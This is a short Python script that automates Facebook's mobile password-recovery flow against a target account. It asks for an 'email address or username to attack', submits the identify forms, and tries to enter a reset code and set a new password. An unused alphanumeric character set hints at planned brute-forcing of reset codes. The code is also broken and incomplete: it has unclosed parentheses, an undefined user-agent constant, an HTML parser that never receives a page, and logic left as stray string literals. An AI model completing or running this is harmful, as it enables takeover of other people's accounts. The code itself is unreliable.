import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup

import mechanize

CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

soup = BeautifulSoup()
email = input('Email address or username to attack:')
"""password = input('Password:')"""
reset = input('Reset:')
browser = mechanize.Browser()
browser.set_handle_robots(False)
cookies = mechanize.CookieJar()
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', MOZILLA_UAS)]
browser.set_handle_refresh(False)
browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
browser.select_form(nr=0)
browser.form['email'] = email
browser.submit()
"""selection confirmation"""
browser.select_form(nr=0)
browser.submit()
browser.select_form(nr=0)
browser.submit()
browser.select_form(nr=0)
browser.submit()
"""if soup.find(string="6 characters long") != None:"""
print(soup.find(string="6 characters long")
"""elif soup.find(string="8 characters long") != None:"""
print(soup.find(string="8 characters long")
"""else:"""
"""  y == 0"""

browser.form['n'] = reset
browser.submit()

"""new password"""
new = input('New Password: ')
browser.select_form(nr=0)
browser.select_form(nr=0)
browser.form['password_new'] = new
browser.form.set_value(reset, nr=2)
y = input('Continue? 1,2, else:')
"""reset code input"""
reset = input('Code: ')
soup.find(string='password_new')

